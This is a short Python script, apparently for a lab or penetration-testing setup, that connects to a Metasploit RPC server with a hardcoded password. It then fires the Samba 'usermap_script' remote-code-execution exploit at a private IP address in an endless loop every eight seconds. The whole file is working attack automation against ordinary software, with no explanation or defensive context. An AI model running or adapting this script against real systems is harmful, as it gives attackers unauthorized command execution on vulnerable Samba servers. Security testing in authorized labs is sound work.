from pymetasploit3.msfrpc import MsfRpcClient
import time

if __name__ == "__main__":
    TARGET_IP = "192.168.21.3"

    client = MsfRpcClient("home5450", port=55552)

    exploit = client.modules.use("exploit", "multi/samba/usermap_script")
    exploit["RHOSTS"] = TARGET_IP

    print("Ctrl + C to stop exploit")
    while True:
        try:
            exploit.execute()
            print(f"Samba exploit on {TARGET_IP}")
        except Exception as e:
            print(f"Error performing exploit: {e}")
        finally:
            time.sleep(8)
